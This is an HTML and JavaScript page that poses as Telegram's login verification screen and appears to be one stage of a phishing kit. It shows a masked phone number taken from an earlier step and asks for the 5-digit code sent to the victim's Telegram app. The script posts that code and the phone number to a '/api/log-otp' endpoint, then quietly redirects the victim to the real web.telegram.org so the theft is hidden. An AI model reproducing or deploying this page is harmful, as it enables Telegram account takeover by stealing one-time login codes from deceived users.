<!DOCTYPE html>
<html>
<head>
    <title>Telegram Verification</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; padding: 20px; }
        .login-box { background: #222; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { text-align: center; font-size: 28px; font-weight: bold; color: #0088cc; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #aaa; margin-bottom: 10px; }
        .phone-display { background: rgba(0,136,204,0.1); padding: 10px; border-radius: 6px; margin-bottom: 20px; text-align: center; font-size: 14px; }
        .phone-display span { color: #0088cc; font-weight: bold; }
        .input-group { margin-bottom: 20px; }
        label { display: block; color: #ccc; margin-bottom: 8px; font-size: 14px; }
        input { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; font-size: 18px; text-align: center; letter-spacing: 10px; }
        input:focus { outline: none; border-color: #0088cc; }
        .hint { color: #888; font-size: 12px; margin-top: 5px; text-align: center; }
        .timer { color: #ffcc00; font-weight: bold; }
        .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn:hover { background: #0099dd; }
        .resend { text-align: center; margin-top: 15px; color: #888; font-size: 14px; }
        .resend a { color: #0088cc; text-decoration: none; }
        .footer { margin-top: 20px; text-align: center; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Telegram</div>
            <div class="subtitle">Enter verification code</div>
            
            <div class="phone-display">
                Code sent to: <span id="displayPhone">Loading...</span>
            </div>
            
            <form id="otpForm">
                <div class="input-group">
                    <label for="otp">5-digit Code</label>
                    <input type="text" id="otp" name="otp" maxlength="5" pattern="\d{5}" placeholder="12345" required autocomplete="off">
                    <div class="hint">
                        Code expires in: <span id="timer" class="timer">02:00</span><br>
                        Enter the code sent to your Telegram app
                    </div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">VERIFY</button>
                
                <div class="resend">
                    Didn't receive code? <a href="#" id="resendBtn">Resend code</a>
                    <span id="resendTimer" style="display: none;"> (wait <span id="resendTime">60</span>s)</span>
                </div>
            </form>
        </div>
        <div class="footer">Telegram WebK Â© 2024</div>
    </div>

    <script>
        // Display phone number
        const savedPhone = sessionStorage.getItem('tg_phone');
        if (savedPhone) {
            // Mask phone number for display
            const masked = savedPhone.replace(/(\+\d{2})\d{3}(\d{4})/, '$1***$2');
            document.getElementById('displayPhone').textContent = masked;
        } else {
            // No phone? Go back
            window.location.href = '/';
        }
        
        // Timer countdown (2 minutes)
        let timeLeft = 120;
        const timerElement = document.getElementById('timer');
        
        const timerInterval = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerElement.textContent = '00:00';
                timerElement.style.color = '#ff4444';
            }
        }, 1000);
        
        // Resend button
        document.getElementById('resendBtn').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Code resent!');
        });
        
        // OTP form submission
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const otp = document.getElementById('otp').value.trim();
            const btn = document.getElementById('submitBtn');
            
            if (!otp.match(/^\d{5}$/)) {
                alert('Please enter a valid 5-digit code');
                return;
            }
            
            // Disable button
            btn.disabled = true;
            btn.textContent = 'Verifying...';
            
            try {
                // Send OTP to logging API
                await fetch('/api/log-otp', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: savedPhone,
                        otp: otp
                    })
                });
                
                // Clear session
                sessionStorage.removeItem('tg_phone');
                
                // Redirect to real Telegram
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org/';
                }, 1000);
                
            } catch (error) {
                console.log('Error logging OTP:', error);
                // Still redirect
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org/';
                }, 1000);
            }
        });
        
        // Auto-focus OTP input
        document.getElementById('otp').focus();
    </script>
</body>
</html>
